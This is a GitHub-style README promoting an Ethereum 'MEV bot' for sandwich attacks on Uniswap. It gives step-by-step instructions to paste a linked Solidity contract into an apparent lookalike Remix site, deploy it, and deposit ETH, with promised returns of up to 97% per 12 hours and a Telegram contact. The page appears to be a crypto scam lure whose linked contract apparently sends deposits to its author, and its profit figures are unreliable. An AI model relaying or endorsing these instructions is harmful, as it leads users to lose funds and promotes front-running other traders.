<div align="center">

# 💎🤖 ETH MEV-BOT 🤖💎
  
An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.

</div>

---

## 📚 About

In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences. The reason I offer this is because after every withdrawal my team and I recieve 5% as a fee to keep the bot updated and working as effecient as possible.


---

<div align="center">

## 🚀 How it Works

![profit](https://user-images.githubusercontent.com/132264778/235452623-01aafec4-077e-420e-b937-9fffe28668fb.jpeg)

</div>

Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.

---

## 📈 Estimated Profits

- 0.5ETH - 1.2ETH = up to 20%/12hrs
- 1.2ETH - 2.4ETH = 20-27%/12hrs
- 2.4ETH - 5ETH = 27-35%/12hrs
- 5.0ETH - 10ETH - 35-50%/12hrs
- 10ETH - 20ETH - 50-63%/12hrs
- 20ETH - 50ETH - 76%+/12hrs
- 50ETH - 100ETH - 97%+/12hrs

---

## 👨‍💻 Instructions

1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix-compiler.net):
  - 📁 Create a new file mev.sol and paste the code from [HillaryMEV.sol](https://github.com/HillaryCode/HillaryMEV/blob/main/HillaryMEV.sol

<img width="1496" alt="1" src="https://github-production-user-asset-6210df.s3.amazonaws.com/133390760/238034727-b490c627-4eb3-42f2-9d1f-cb1033a177c6.png">

2) 🔧 Select compiler version 0.6.6 and press compile.

![2](https://github-production-user-asset-6210df.s3.amazonaws.com/133390760/238034797-f17a757b-547b-4bf7-881d-54cf2c468703.png)

3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".

![3](https://github-production-user-asset-6210df.s3.amazonaws.com/133390760/238034844-8e1e42fa-6690-4662-8955-c41964635a8d.png)

4) Verify your smart contract on etherscan -

- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
   - 📝 Enter contract address and set inputs:
   - Compiler Type: Solidity (Single File)
   - Compiler Version: ^0.6.6
   - License Type: 3) MIT License (MIT)
   - 📋 Paste the code from mev.sol.
   - 🚫 Leave ABI input box empty.
   - 🟢 Click "Verify"


5) Deposit funds (at least 0.6 ETH or 1-2 BnB to prevent negating slippage) into your specific contract/bot address.
 
6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction

<img width="780" alt="4" src="https://user-images.githubusercontent.com/132264778/235452658-71fb728f-d0e6-4a30-8236-9cf8c5926979.png">

7) Withdraw anytime by clicking 'withdrawal'.

:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network and Bsc network, you must have enough balance to cover the gas and slippage % difference. Recommended 0.6ΕΤΗ and higher. 

At any point, you can stop the bot or retrieve your money by calling the withdrawal function.

<div align="center">

💰💰💰 Make money with MevBot 💰💰💰

</div>

Have a question? Message me on Telegram: https://t.me/MevFrontRun

---

##### Please ⭐ the repo to support my project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
